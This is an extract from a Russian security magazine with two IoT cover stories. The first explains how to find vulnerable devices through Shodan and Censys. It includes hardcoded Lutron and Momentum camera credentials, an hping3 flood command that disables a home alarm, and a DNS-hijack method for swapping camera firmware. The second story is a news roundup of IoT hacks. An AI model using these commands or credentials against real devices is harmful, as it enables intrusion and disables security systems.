 • Pixel Color Reader — Android — биб лиотека для чтения цве та пикселей
   с экрана;
 • DB Preferences — альтернатива стандартному API Preference на основе
  зашифрованной библиотеки;
 • UnderlinePageIndicator — индикатор переключения табов, совместимый
   с ViewPager;
 • android‐face‐detector — библиотека для распознавания лиц на основе
   Firebase ML Kit;
 • vector‐analog‐clock — view с реализацией векторных аналоговых часов;
 • LazyDatePicker — диалог выбора даты с ручным вводом;
 • FastList — библиотека для быстрого соз дания списков на основе Recy‐
   clerView без исполь зования адаптера view holder’ов;
 • TypeWriterView — view с эффектом печатной машин ки (посимвольный
   набор текста).
 COVERSTORY
ОПАСНЫЙ
IOT





                                КАК НАЙТИ
                  УЯЗВИМЫЕ УСТРОЙСТВА
              И ЧТО МЕШАЕТ ИХ ВЗЛОМАТЬ
    84ckf1r3
84ckf1r3@gmail.com





  Когда читаешь новости про недавно обнаруженные уяз‐
  вимости или смот ришь выступления на хакерских конферен‐
  циях, то складывается впечатление, что сегодня все подклю‐
  чено  к интернету и легко взла мыва ется. Причем часто
  для взлома не требуется ни высокой квалификации, ни спе‐
  циализированного оборудо вания. Давай выясним на прак‐
  тике, так ли это!


  МИЛЛИАРДЫ ПОТЕНЦИАЛЬНЫХ ЦЕЛЕЙ
  По данным Statista.com, объ ем рын ка интернета вещей в 2017 году пре высил
  миллиард долларов. Общее число подключенных к интернету устройств оце‐
  нивается на текущий момент в 23 с лишним миллиарда с перспективой уве‐
  личения до 30 миллиардов к 2020 году. Пос ле этого аналитическое агентство
  IHS Markit прогнозирует нелинейный рост до 125 миллиардов устройств
   к 2030 году. Такой объ ем производс тва вполне возможен, но уже сейчас
  ударные темпы выпуска IoT‐устройств достигаются преиму щественно за счет
  самых дешевых «китайских» девайсов, при раз работке которых о безопас‐
  ности думали в последнюю очередь.
    Среди компонентов умного дома и даже охранных систем значительная
   часть имеет проб лемы с безопас ностью, причем характерные для целой пле‐
  яды устройств, а не прос то какой‐то одной серии не самого надежного вен‐
  дора. Речь идет о массовых и гру бых нарушениях принципов разработки. Это:
   • использование неизменя емых (hardcoded) и скрытых сервисных учетных
     данных;
   • применение одинаковых либо легко предсказуемых ключей и ПИН‐кодов;
   • отсутствие проверки прав дос тупа при обра щении к известной странице
     настроек (например, /settings.asp в обход /index.htm) или прямого
     вызова изображений и видеопотока IP‐камеры (вроде /axiscgi/jpg/
    image.cgi);
   • некорректная обработка получа емых данных, вызывающая перепол нение
     буфера.  Как  следствие,  возможно выполнение произвольного  кода
     при получении злонамеренно составлен ного TCP‐пакета;
   • принудительное переключение сервера на использование старых версий
     протоколов по запросу клиентского устройства (я старая глупая железка,
     давай со мной по‐простому);
   • десятки других типовых ошибок и намеренных ослабле ний безопас ности
     ради удобства конфигурирования нес пециалис тами (в том чис ле — уда‐
     ленного и без надлежащей авторизации).


  КАК ИСКАТЬ УЯЗВИМЫЕ IOT-ДЕВАЙСЫ
  Исследователи предлагают множес тво алгорит мов поис ка дружественных
   к хакеру устройств, и самые эффективные из них уже опробованы создателя‐
  ми ботнетов. Я вооб ще считаю использование уяз вимостей в ботнетах
  наиболее надежным критерием оценки легкости их массовой эксплуатации
  на практике.
     Кто‐то пляшет от прошивки (точнее, тех диких ошибок, которые были обна‐
  ружены при ее анализе методами реверс‐инжиниринга). Другие в качестве
  отличительного признака берут название производителя (его можно оп‐
  ределить по первым трем октетам MAC‐адреса) или версию ОС (большинс‐
  тво устройств сообщают ее в сетевом отклике, в том числе и роботам‐паукам
  поисковиков). В любом случае для успешного поис ка нам нужен некий отли‐
  чительный признак уязвимого девайса, и хорошо бы найти несколько таких
  маркеров. Поэтому я предлагаю пойти следующим путем.
     1. Обращаемся к базе уяз вимостей — нап ример, MITRE или Rapid7 —
  и находим инте ресующие нас бреши у определенных IoT‐девайсов. Наиболее
  гарантированными в плане использования будут уяз вимости следующих
   типов:
   • обнаруженные после  того,  как произво дитель прекратил поддержку
     устройства и выпуск пат чей;
   • обнаруженные недавно (для которых еще нет исправлений, либо боль‐
    шинство пользователей не успели исправления применить);
   • архитектурные баги, пло хо исправляемые софтверными патчами и редко
     устраняемые до конца — вроде уяз вимос ти Spectre, сущес твующей в нес‐
     кольких разновидностях и акту альной до сих пор;
   • влияющие сразу на несколько моделей и даже типов устройств (например,
     из‐за общего компонента веб‐интерфейса или уязвимости самого про‐
     токола коммуникации).

     2. Изучаем подробнос ти о найденных уяз вимос тях и затрагиваемых ими
  устройствах. Читаем всю дос тупную документацию в поисках уникальных мар‐
  керов и деталей допущенных разработчиком ошибок. Нужно определить осо‐
  бенности, отличающие интерес ные нам девайсы от массы дру гих подобных.
  Например, в отклике от уязвимого устройства содержится строка с номером
  определенной вер сии ОС, ревизии протокола или у него будет открыт нес‐
  тандартный порт.
     3. Составляем продвинутые поисковые зап росы для Google и спе циали‐
  зированных поисковиков по интернету вещей:
   • Shodan,
   • Censys,
   • ZoomEye.

  Подробнее о них и примерах продвинутого поиска читай в наших статьях
  по ссылкам выше.


              INFO

                        Для предотвращения наплыва кулхацкеров мы
                         не станем приводить айпишники уязвимых сис‐
                            тем, некоторые детали и подробные зап росы,
                          позволяющие обнаружить легкие цели в один
                             клик. Однако разгадка лежит на поверхности.
                       Достаточно внимательно прочитать описание уяз‐
                        вимости и добавить к приведен ному примеру
                          один‐два поисковых фильтра.
                       Дополнительный   отсев   недоб росовестных
                          исследователей мира IoT выполняют сами сер‐
                        висы Shodan и Censys. Без регистра ции они
                         показывают только первые результаты поиска,
                          ограничивают количество зап росов в день и не
                          позволяют их эффективно уточнять. Все самое
                          интересное обычно начинается после первой сот‐
                         ни результатов, а то и дальше.


  Поиск IoT‐девайсов легко ускорить за счет скрип тов. Например, RussianOtter
   Mult‐API Network Scanner или GasMasK. Для их использования (как и для при‐
  менения собственных скрип тов) понадобится регис трация в Shodan и Censys.
     4. Проверяем цели из поисковой выдачи и (при необходимости) про‐
  сеиваем ее допол нитель ными запросами. Такая необходимость возникает
  практически всегда, поэтому для парсинга резуль татов часто используют
  скрипты. Например, скрипт от thesubtlety.
     5. Подбираем инстру ментарий для подключения к найденным IoT‐девай‐
  сам. В большинстве случаев будет достаточно браузера. Для управления
  камерами и DVR иногда потребуется пос тавить старую версию Java RE и спе‐
  цифический видеокодек. Часто бывают нужны Telnet‐ и SSH‐клиенты. Реже
  потребуется софт от раз работчика, нап ример Cisco Smart Install Client.
     6. В зависимости от того, как далеко ты намерен зай ти, ограничиваемся
  сбором статистики или выполняем тестовое подклю чение и пробуем менять
  настройки. Последнее не рекомендуется делать, в том чис ле и потому, что ты
  с легкостью можешь нар ваться на ловушку (honeypot). Интерполу тоже надо
  поднимать показатели рас крываемости преступлений в сфере ИБ, а не слиш‐
  ком осторожный исследователь — идеальная цель.


  При ори тет ные мишени
  Нам было интересно узнать, что чаще всего становится мишенью в мире IoT.
  За комментарием мы обратились к специалисту по защите информационных
  систем компании GS‐Labs Егору «Xarlan» Литвинову, чьи статьи ты уже навер‐
  няка читал.
   — Егор, как ты считаешь, какие девайсы из интерне та вещей
  сегод ня име ют самые дырявые про шивки?
   — Что значит «самая дырявая про шивка»? Та, в которой больше всего
   багов, или та, где есть всего один баг, но его экс плуатация может привести
   к фатальным последствиям? Наверное, тут поможет список OWASP Top 10 IoT
   Vulnerabilities. Он  хоть и датирован 2014  годом, но смежный  доклад
  про небезопасность мобильных приложений, звучавший на PHDays 2018,
  показывает, что очень не зря существует OWASP TOP 10.
   — Можешь привести какие‑нибудь недавние примеры?
   — Из свежих примеров дырявос ти IoT — DNS rebinding — «сетевое
  устройство привязывают к вредонос ному DNS‐серверу и превращают его
  в точку входа в инфраструктуру жертвы». Ну и как результат — «интерактивная
  колонка Google Home позволяет зло умышленнику манипу лировать ее нас‐
  тройками, сканировать  Wi‐Fi‐сети, запус кать  установленные при ложе ния
  и воспроизводить мультимедийный контент».
    Или недав няя новость о том, как зло умышленники пытаются проэксплуати‐
  ровать критическую уязвимость в маршрутизаторах D‐Link, чтобы те в свою
  очередь пополнили ряды ботнета Satori.
   — А какие IoT-девайсы взламывают чаще все го?
   — Чаще всего взламыва ют те IoT‐девайсы, которые наиболее распростра‐
  нены. Ярким примером может служить ботнет Mirai, который «ломал» IP‐
  камеры и DVR‐регистра торы. В каком‐то смыс ле, думаю, он уже вошел
  в учебники истории по ИБ. Кстати, с IP‐камера ми связана и дру гая серьезная
   уязвимость. При определенном рас кладе плохие парни могут получить пол‐
  ный контроль над IP‐камерами фир мы Axis.
   — Ну а кро ме камер?
   — Чтобы нем ного разбавить тему взлома IP‐камер и роутеров, стоит ска‐
   зать пару слов об атаке Z‐Shave. Хорошим парням удалось откатить протокол
  шифрования S2 до уязвимой версии S0 (в случае протокола S0 использовал‐
  ся сложнейший ключ шифрования в виде шестнадцати нулей) и далее эксплу‐
  атировать баги в протоколе S0. В результате чего «белые шляпы» сумели
  открыть смарт‐замок Yale.
    Но это как раз пример нетривиальной атаки. В общем случае сначала
  будут взламываться те устройства, которые исполь зуют «стандартные» про‐
  токолы передачи данных — Ethernet, Wi‐Fi, Bluetooth. Уже потом под удар
  могут попасть гаджеты, работа ющие на различных RF‐протоколах — ZigBee,
  LoRa, Z‐Wave и других.
   — Есть какие‑то иные прин ципы выбора целей, кро ме типа
  устройства?
   — Другим критерием того, какие устройства наиболее вероятно станут
  мишенью, является применение однотипных ОС. Думаю, ни для кого не сек‐
   рет, что в embedded зачастую используются облегченные вариации Linux.
  Потом уже идут другие встроенные ОС: FreeRTOS, ChibiOS, embOS и масса
  других RTOS. Вот и получа ется, что ботнеты (Mirai, Satori, Persirai и подобные)
  сначала будут атаковать то, что подключается по Ethernet/Wi‐Fi и работает
  под Linux, и только потом в их прицел, воз можно, попадут менее популярные
  варианты.



  РАЗБОР СВЕЖИХ УЯЗВИМОСТЕЙ
  Перейдем к практике и раз берем какой‐нибудь при мер взлома IoT‐девай сов
  подробнее. Из открытой базы данных MITRE мы узнали, что есть свежий
  набор взаимосвязанных уяз вимос тей:
   • CVE‐2018‐11681;
   • CVE‐2018‐11682;
   • CVE‐2018‐11629.

  Вместе они затрагивают десятки разных IoT‐устройств, использующих про‐
  токолы RadioRA2 или Homeworks QS в сис темах управления умным домом
  от Lutron electronics. У этих девайсов открыт порт 23 (Telnet) и прошиты скры‐
  тые сервисные аккаунты для предоставления клиентам удаленной поддержки.
  Пары логин/пароль выглядят  так: lutron/integration или nwk/nwk2 —
  в зависимости от типа устройства и ревизии про токола.
    Среди уязвимых хостов есть диммеры и выключатели освещения, а также
  элементы HVAC (отоп ление, вентиляция и кондиционирование). Теоретичес ки
  их даже можно исполь зовать как точку входа (если применяется единая сис‐
  тема управления), чтобы добраться до более серьезных целей — охранных
  систем (сигнализации, электронных замков, авто матических ворот) и виде‐
  онаблюдения. Вот какие команды можно отпра вить им по Telnet.





                Удаленное управление IoT‐девайсами Lutron

  Censys поддерживает геофильтры, да и пресс‐релизы часто содержат дан‐
  ные, которые помогают определить физичес кое местоположение целей.
  Из этих двух источников мы узнаем, что устрой ства Lutron установлены на ста‐
  дионе Уимблдон, в музее Гуггенхайма, в Тайбэйском международном финан‐
  совом центре, а также в десятках банков, больниц и даже в космическом цен‐
  тре им. Кеннеди близ мыса Канаверал.
    Самое интересное, что сервисные учет ки не могут быть отключены поль‐
  зователем. Также он не может сменить дефолтный пароль для них — все
  захардкодили в прошивке. По умолчанию Telnet дает три попытки авториза‐
   ции, а у нас есть два проверенных варианта, и один из них гарантированно
  подойдет. Казалось бы, это настоящий рай для любителей легкого взлома!
    Почему казалось? Да потому, что в реальности не все так прос то. Обна‐
  руживший эту уязвимость Давид «SadFud75» Кастро (David Castro) приводит
  красивый поисковый зап рос для Censys: (metadata.product:Homeworks
  Processor) AND protocols.raw: "23/telnet". Сейчас по нему находится
  более двух тысяч лутроновских устройств с открытым портом 23 (совсем
  недавно их было больше семи тысяч). Сна чала глаза разбегаются, а затем
  впадаешь в отчаяние. Ты пингуешь уже сто первый узел, но и он не принимает
   указанные пары логин/пароль. В чем же дело?
    При всей подробности описания Давид Кас тро ожидаемо умол чал
  об одной важной детали (на самом деле не об одной, но не будем спой‐
   лерить). По факту уязвимы только девайсы, подклю ченные через интегра‐
  ционный протокол с ревизиями от M до Y… и то не все. Когда об уязвимости
  стало известно, то ее не смогли оперативно закрыть патчем, но дали
  рекомендации, как затруднить ее использование.
    Метод противодействия оказался прос тым и довольно изящ ным. Пос коль‐
   ку нельзя одновременно установить более одно го подключения с одним
  и тем же логином, владельцам посоветова ли залогиниться под сервисными
   учетками и поддерживать коннект. Служба поддержки уже сде лала это у боль‐
  шинства клиентов. Теперь, ког да ты нашел уяз вимый девайс и наивно
  пишешь в Telnet‐клиенте login: lutron, в большинс тве слу чаев получаешь сооб‐
  щение login incorrect, хотя он вполне себе корректный.
    Примечание для самых малень ких: в Linux обычно есть клиент Telnet,
  а если он еще не установлен, то это легко исправить командой sudo apt‐get
  install telnet. В Windows проще воспользоваться portable‐клиентом, нап‐
  ример PuTTY.





                     Подключись, если сможешь


  МИФОЛОГИЯ IOT
  Подобные недомолвки негласно приняты как этичес кий стандарт «белых
  шляп». С одной стороны, это защита от воинс твующих школьников, которые
  иначе прочитают о легком взло ме и ломанутся хакать все подряд. С другой
  стороны, приведен ный в качестве примера зап рос создает не менее опасные
  иллюзии. Он и подобные ему демки формируют мнение о наличии неисчисли‐
  мого множества актуальных целей для ботнетов и тотального факапа среди
  производителей IoT‐девайсов.
     Просто помни, что, задав поисковый запрос к Shodan или Censys, ты
  получаешь доволь но объемную, но сырую выдачу. В ней содержится лишь
  список удовлетворяющих критериям поиска целей, каждую из которых
  по‐хорошему нужно проверять на подверженность искомой уязвимости.
  Это самая кропотливая часть, которой пренеб рега ют многие исследователи
  ради внушительной цифры в докладе. Зачем же делать по‐хорошему, когда
  можно оставить как есть и вставить в презентацию красивый скриншот, впе‐
   чатляющий аудиторию большими числами?
     Так появляются перлы про  «сотни миллионов  уяз вимых  устройств»
  и «тысячи недобросовестных вендоров» на DEF CON и Black Hat, а потом эти
  страшилки подхватывают журналисты с легкого пинка антивирус ных компаний
  и прочих разработчиков защитных систем. Напугать и пред ложить готовое
  решение со скидкой — клас сический метод повышения продаж.
     Аналогичная ситуация складывается и с дру гими уязвимос тями, которыми
   так пугали в последнее время. Из описания при веденной выше атаки Z‐Shave
  мы узнаем, что она «потенциально затрагива ет 2400+ производителей и свы‐
  ше 100 миллионов IoT‐девайсов — от умных лампочек до дверных замков».
  Складывается жуткая картина, в которой хакеры удаленно в пару кликов
  устраивают день открытых дверей и тотальный блэ каут. Однако в реальности
  ничего подобного не слу чалось. Почему?
     Как обычно, дьявол кро ется в деталях. Чтобы воспользоваться данной уяз‐
  вимостью, удален ное подклю чение не годится. Нужно сварганить хакерский
  девайс и оказаться вмес те с ним рядом с уяз вимым устройством, чтобы
  перехватить его радиосигнал и вынудить ответным кодом перей ти на старый
  небезопасный протокол. Ты полетишь в Сан‐Диего со сниффером для Z‐
  Wave, чтобы выключить кому‐то свет в уборной? Рискнешь открыть один
  замок из двух‐трех разных и нарваться на пат руль (а то и пулю)?
     Для большинства такая игра прос то не стоит свеч. Это лишь досадный
   казус, показывающий потенциальную опасность использования чужих раз‐
  работок в своих продуктах. Silicon Labs вообще не считает это уязвимостью,
  а называет побочным эффектом обратной совместимос ти, что тоже полуп‐
  равда.


  ОТКЛЮЧАЕМ СИГНАЛИЗАЦИЮ
  Из‐за скромных вычислительных ресурсов на IoT‐девайсы крайне просто
  выпол нить DoS‐атаку. Банальный ICMP‐флудинг парализует их, что в случае
  охранных систем не менее опас но, чем НСД. К примеру, домашняя/офисная
  сигнализация iSmartAlarm Cube содержит ряд уяз вимос тей (CVE‐2017‐7728,
  CVE‐2017‐7729, CVE‐2017‐7730), позволяющих удаленно заб локировать ее
  одной командой. Мы уже писали об этом в общих чертах, а сейчас разберем
  подробнее.





                     Не такой уж и smart девайс

  Достаточно запустить утилиту hping3 (она есть в сос таве Kali Linux в разделе
   Information Gathering → Live Host Identiﬁcation) и наб рать команду


  $ hping3 ‐‐flood ‐S ‐p <port> <IP>

  Здесь ‐‐flood — режим отправки пакетов без ожидания ответа, ключ ‐S
  задает SYN‐флаг, а ‐p — номер пор та (по умолчанию он задан как 12345).
  Все! Как только ты нажмешь Enter, ICMP‐пакеты поль ются рекой на iSmartA‐
   larm Cube. Сигнализация будет так увлечена бесконечными ответами на них,
   что не сработает при физическом вторжении (контроллер просто не успе ет
  обработать данные от датчика движения за отведенное время). Более того,
  вернуть сигнализацию к жиз ни без перезагрузки и отключения от интернета
  не удастся ни удален но, ни локально.
     Если этого мало, то CVE‐2017‐7728 поз воляет получить пол ный удаленный
  контроль над сигнализацией, пос кольку в ней кри во реализована аутен‐
  тификация. Готовый PoC на Python лежит здесь — спасибо Илье Шнайдману.
  Плюс на месте появляется хороший шанс вос пользоваться другой уяз‐
  вимостью из указанной выше триады — CVE‐2017‐7729. iSmartAlarm позволя‐
   ет перехватить ключ авто риза ции по локальной сети, поскольку он переда‐
  ется в открытом (незашифрованном) виде. Какая прелесть!
    На момент написания PoC компания iSmartAlarm не пре дос тавила ни офи‐
  циальных комментариев, ни пат чей.


  И СНОВА ПРО КАМЕРЫ
  Подробный анализ уязвимостей IP‐камер у нас уже был, поэтому разберем
  только свежий пример. В апреле 2018 года компания Locklin Networks про‐
  вела аудит безопасности прошивки популярной сетевой камеры Momentum
   Axel 720P и с трудом удержалась от нецензурной бра ни в отчете.
     У камеры было обнаружено множество зияющих брешей в системе
  безопасности:
   • все процессы запускаются от рута;
   • при физическом подключении к UART‐порту консоль также становится
     доступна под рутом и без авторизации. Через нее легко прочитать файл
     клю ча, хранящийся по дефолтному адресу /devinfo/Ozvision/key/<
    deviceid>.key;
   • пароли хранятся в /devinfo в фор мате SQLite без шифрования и чита‐
     ются командой showKey;
   • логины и хеши паролей дополнитель но читаются из консоли без авториза‐
     ции командой cat /etc/passwd;
   • возможна локальная подмена прошивки с SD‐карты безо всяких проверок;
   • возможна удаленная перезапись прошивки через DNS‐Hijacking. Редак‐
     тируем /etc/resolv.conf, прописываем туда наш DNS‐сервер и под‐
     меняем на нем переход с firmware.momentumcam.com на свой сайт
     с модифицированной прошивкой;
   • видео доступно из локальной сети через потоковый протокол реального
     времени (RTSP) и порт 554. Авториза ция не требуется. Пример запроса:
    rtsp://<camera_ip>:554. Поток можно посмотреть через VLC Media
      Player;
   • в прошивке есть неизменяемые (hardcoded) сервисные аккаунты: root/
    EHLGVG и admin/EHLGVG.

  В общем, удачного тебе поиска акселевских камер!


 ВЫВОДЫ
  Уязвимостей в IoT‐девайсах действительно много, однако не все из них столь
  легко эксплуатировать, как в перечисленных выше примерах. Одни требуют
  физического подклю чения, нахождения рядом или в той же локальной сети.
  Использование других временно усложня ется после опубликования деталей
  и до выхода официального патча.
    С другой стороны, производители вовсе не спешат патчить прошивки
  и вообще признавать свои промахи. Поэтому легких целей всегда хватает.
  Составление их точного списка потребует гораздо больше усилий, чем
  разовое обращение к специализиро ванным поисковикам. Однако львиная
  доля поисковой выдачи Shodan, Censys и ZoomEye не имеет отношения к лег‐
  ко взламываемым устройствам. Прос то сетевой отклик многих узлов частично
  совпадает с запросом исследователей, ищу щих подходящие цели.
   О реальных масшта бах распространенности потенциальных мишеней
  для ботнетов можно судить только пос ле углубленного анализа поис ковой
  выдачи и непосредственных проверок, которыми обычно пренебрегают.


         WWW

                        •Здесь можно проверить,  является  ли  выб‐
                           ранная цель ловушкой
                             •IoT Testing Guides
                          •Scanning for Vulnerable Devices in the Internet
                                  of Things
                         •Query Shodan and Censys data for fast parsing
COVERSTORY

 СМЕШНЫЕ
И СТРАШНЫЕ
   ВЕЩИ





       Мария Нефёдова                                               Андрей Письменный
          nefedova@glc.ru                                                         Шеф‐редактор
                                                                                 apismenny@gmail.com




          ВСПОМИНАЕМ
    САМЫЕ ЗРЕЛИЩНЫЕ ВЗЛОМЫ IOT
     ЗА ПОСЛЕДНИЕ НЕСКОЛЬКО ЛЕТ





Подключение к интернету наделяет многие из домашних
устройств новыми полезными качества ми, но безопасность
в мире IoT часто работает по прин ципу «заходи кто хочешь,
бери что хочешь». В этом материале мы попытались собрать
все интерес ное, что случалось в этой области за последнее
время: от курьезов вроде взло ма вибраторов до вещей,
которые потенциально могут быть опасными для жизни.


В среднем домашнее устройство, к которо му есть доступ из интернета, под‐
вергается атакам раз в две минуты. В этом убедился исследователь Иоганн
Ульрих: он специально выставил на всеобщий доступ систему видеонаб‐
людения с паролем по умолчанию и посмотрел, кто придет к нему в гос ти.
  Сверившись с поисковиком Shodan, специалист обнаружил информацию
о 592 атаковавших его девайсах. В основном это были другие IoT‐устрой ства
производства TP‐Link, AvTech, Synology и D‐Link, зараженные разной мал‐
варью. «Мы наблюдаем пос тоянное при сутствие 100 000–150 000 источников
Telnet‐сканирований. И  эта  проблема  в  обозримом  будущем  никуда
не исчезнет», — пишет Ульрих.
   Иногда в отсутствии защиты винова ты сами пользовате ли, которые невер‐
но настраивают девайсы или ста вят пароль вроде 123456 (это действительно
все еще самый популярный пароль — нес мотря на все пре дупреждения).
Иногда напортачить может тот, кто их устанавливает: в конце мая была чудес‐
ная история про бразильского провайдера, который ставил людям роуте ры
вообще без пароля. А иногда под подозрение попадают сами протоколы
(смотри, например, тревожные результаты аудита ZigBee).
  Однако чаще всего ответственность лежит на раз работчиках, которые
сначала пренебрегают дотошной про веркой, а потом утешают себя  (и
покупателей) тем, что выпус тили заплатку. В реальнос ти же в Сети остаются
сотни тысяч незапатченных устройств, которые становятся легкими жертвами
ботнетов либо даже звень ями в цепи целенаправленного проникновения.
  Значительная часть таких девайсов — это скучные роуте ры, сетевые хра‐
нилища и камеры видеонаблюдения. Но чем больше к Сети подключают вся‐
кого разного, тем больше появляется зрелищных при меров.


10 показа тель ных курь езов
Прежде чем мы перейдем к пуга ющим крупномас штабным уяз вимос тям, про‐
бежимся по всякой экзо тике, которую ломают в основном ради того, чтобы
доказать саму возможность несанкционированного проникновения. Однако
не стоит недооценивать и серь езность этих исследований: хоть почти все
примеры ниже и обошлись без жертв, утечка персональных данных вполне
может обернуться личной трагедией.

1. Виб ратор с камерой ведет пря мую тран сля цию
Сложно придумать пример более интимных гаджетов, чем сексуальные
игрушки. Возможно, именно поэтому не стоит спешить снабжать их компь‐
ютерами, а если и делать это, то с большой осто рожностью. Раз работчики
вибратора Siime Eye с видеокамерой и беспро водным интерфейсом пре неб‐
регли безопасностью: устройство работа ет в режиме точки доступа Wi‐Fi
с паролем по умол чанию. Зло умышленник, находя щийся в зоне покрытия,
может не просто смотреть видео, но и при желании настроить устройство так,
что все новые ролики будут приходить ему в Skype. Кстати, вибраторы другой
фирмы пентестеры до этого уже уличили в том, что те слали на базу слишком
много личных данных.





2. Бен зоколон ка дарит бен зин всем жела ющим
Инцидент произошел в июне это го года. Из‐под контроля служащего авто‐
заправочной станции вышел насос, который более полутора часов раз давал
бесплатное топливо всем желающим, так как сис тема не реагировала ни на
какие команды. Странным сбо ем успели восполь зоваться более десяти
автовладельцев, которые заправились в общей сложности на 1800 дол ларов
США. Есть подозрение, что какие‐то умельцы смог ли удаленно перевести
систему в режим отладки и отключить ее от свя зи с кассовыми терминалами.





3. Плю шевые игрушки шпи онят за деть ми
Защитить сам гаджет мало, важно обеспечить и безопасность его облачного
бэкенда. В этом плане показательна ис тория производителя игрушек Cloud‐
Pets, который забыл дол жным образом защитить базу данных MongoDB.
Вскоре ее многократно ска чали неизвес тные личности, получив доступ к дан‐
ным 821 296 аккаунтов и 2 182 337 аудиозаписей, которыми обменивались
дети и их родите ли через плюшевых зверей. Кста ти, и сами игрушки тоже ока‐
зались уязвимыми: из‐за отсутс твия механизма  pairing encryption любой
желающий может выкачать из них все данные по Bluetooth.





4. Гирос кутер мож но угнать уда лен но
Покопавшись в софте скутеров Ninebot Segway miniPRO, пентестеры об‐
наружили, что к любому из них можно невоз бранно под ключиться по Blue‐
tooth, введя неизменяемый ПИН‐код — четыре нуля. Атакующий может зас‐
тавить устройство загрузить вредоносную прошивку (проверок целостности
не производится), да и в официальном приложении тоже нашли дыру. Все
это позволяет причинить физичес кий вред пользователю. К примеру, зло‐
умышленник в любой момент может приказать гироскутеру резко остановить‐
ся или поехать; изменить механизмы безопас ности, которые не дают устрой‐
ству перегреваться; попросту угнать гироскутер, зас тавив его уехать от вла‐
дельца в неизвестном нап равлении, или сменить ПИН‐код, заблокировав
пользователю доступ.





5. Аква риум помог про ник нуть в казино
Неизвестным злоумышленникам уда лось скомпрометировать умный аква‐
риум, который стоял в казино и был подключен к внутренней сети. Дальше
атака не пошла, но сама возможность такого вектора проникновения —
это что‐то, что еще недавно казалось бы изоб ретательной научной фантасти‐
кой. Зачем вообще нужен подключенный к интернету аквариум? Дело в том,
что он позволяет удаленно кормить рыбок и поддерживать для них комфор‐
тные условия, к примеру следить за температу рой воды.





6. Весы готовы нас плет ничать о весе вла дель ца
В напольных весах Aria фирмы Fitbit была найдена уязвимость, которая ста‐
вила под угрозу разглашения такие важные данные, как вес пользователя
и процент жировых тканей от общей мас сы его орга низма. Эксперт из Google
Project Zero, которо му принадлежит находка, со смехом рас сказал в своем
твиттере, что речь идет о нескольких серьезных проблемах с безопасностью.
В Fitbit их поспешили закрыть и не стали делиться техническими подробнос‐
тями. Однако есть неофициальные данные: весы использовали статические
идентификаторы для DNS‐запросов, что позволяло атакующему обмануть
устройство и заставить его синхронизировать ся со сторонним сервером.
А потом зло шутить в интернете о весе владельца.





7. Посудо мой ка уяз вима перед обхо дом катало га
Исследователь об наружил, что промышленные моечные машины Miele Pro‐
fessional PG 8528, предназна ченные для лабораторий и дру гих крупных пред‐
приятий, уязвимы перед ата ками на обход катало га. Они име ют интерфейс
Ethernet для отправки текстовых отчетов о работе машины. Подключившись
к веб‐серверу PST10, исследователь попробовал обойти каталоги. Один
удачный запрос к /etc/shadow, и вот мы уже сидим на посудомойке под рутом.





8. Пли та, которая чита ет SMS
Плиты Aga профессиональной серии iTotal Control оснащаются SIM‐картой
и подклю чаются к мобильной сети. Владелец может отправлять команды
с телефона, чтобы управлять плитой. Как выясни ли исследователи, сде лать
это может и любой желающий: достаточно подоб рать номер телефона. Кста‐
ти, то, как производитель игнорировал информа цию об этом, показательно
еще больше, чем отсутс твие авториза ции.





9. Чай ник и кофевар ка рас ска жут пароль от Wi-Fi
Умный предмет в доме пен тестера рано или поздно станет объектом прис‐
тального внимания — как те солонки из памятного нам текста «Хакер в сто‐
ловой». На этот раз исследова тель решил изу чить безопас ность купленного
им умного чайника с Wi‐Fi и на его при мере про демонс трировал, как при
помощи направленной антенны сначала перехватить контроль над устрой‐
ством, а потом вытянуть из него пароль от самой сети. С кофеваркой той же
фирмы дела, как выяснилось, обстоят не лучше. В общем, даже на чай ник
в наше время тоже нужно ставить стойкий пароль!





10. Розет ка раз болта ет лич ные дан ные
Исследователи подвергли испытаниям умную розетку неназванного произво‐
дителя и нашли целые грозди уязвимос тей: от слабого пароля по умол чанию
(добрая традиция в мире IoT) до возможности зайти на устройство и повысить
привилегии до root без вся кого пароля (для этого, правда, нужно находиться
в той же сети или перехватить трафик в момент авторизации). Внутри тоже
нашлось много интересного — в том числе логин и пароль (!) от почты вла‐
дельца, которые хранятся в незашифрованном виде.





АРМИЯ ИЗ ЛАМПОЧЕК
Может сложиться впечатление, что все эти уяз вимос ти не так важны в реаль‐
ной жизни: ведь кто‐то должен очень уж заин тересоваться тобой, чтобы взла‐
мывать твой тостер. В реальнос ти опа сать ся в первую оче редь стоит не APT,
а вирусов. Их авторы пользуются тем, что среди умных гаджетов еще чаще
встречаются экземпляры без критических обновлений, чем среди веб‐сер‐
веров. А любой незащищенный компьютер, до которого можно добраться,
легко становится частью ботнета.
  В конце октября 2016 года жители США и европейских стран (включая
Россию) на собственном опыте смогли прочувство вать, какие проблемы кро‐
ются за плохой защитой умных предметов. Ботнет Mirai, заразивший мил‐
лионы устройств, атаковал DNS‐провайдера Dyn, из‐за чего с перебоями
работали социальные сети, новостные сайты, популярные стриминговые сер‐
висы. Практически недос тупны оказались Twitter, Reddit, PayPal, Airbnb, Spotify,
GitHub, Heroku и множество дру гих сервисов.





Mirai и его клоны работают следующим образом. Они сканиру ют Сеть в поис‐
ках уязвимых IoT‐девай сов, к которым можно подклю читься посредством Tel‐
net. Малварь имеет жестко закодированный и весь ма длинный список учет‐
ных данных, использующихся по умолчанию в раз личных гаджетах.
   Спустя год американским властям уда лось обнаружить и арестовать троих
создателей Mirai. Как оказалось, они вовсе не собирались раз рабатывать
мощнейшее кибероружие, которое вызвало впол не обоснованную тревогу
у властей по всему миру. Изначально Mirai и ботнет, пос троенный на базе
мал вари, предназначались для обычных DDoS‐атак по найму.
  Однако поимка зачинщиков в данном случае не играет никакой роли.
Исходный код Mirai был опубликован в сво бодном доступе, и с тех пор успело
расплодиться множество модификаций и ана логов. Да и дру гой известной
мал вари, атакующей IoT, тоже полно: можно вспомнить ботнеты Hide ‘N Seek,
Satori, Prowli, IoTroop, Hajime и другие.


САМЫЕ КРУПНЫЕ ГАДЖЕТЫ
Когда мы говорим «интернет вещей», то сразу представляем себе умные
лампочки, холодильники с экра нами и прочую домашнюю утварь. Однако
с похожими проб лемами  сталкиваются и  в промышленности. Истории
про хаки критической инфраструктуры в пос леднее вре мя идут одна за дру‐
гой, и многие эксперты разделяют мнение, что за некоторыми из этих слу чаев
стоят не хакеры‐одиночки, а правительства. Если для публики история
со Stuxnet — это просто занятная байка, то для специалистов она, похоже,
стала примером для подражания.


Ук раин ская элек тростанция
23 декабря 2015 года укра инская компания «Прикарпатьеоблэнерго» сооб‐
щила, что в работу ее систем было про изведено некое «вмешательство».
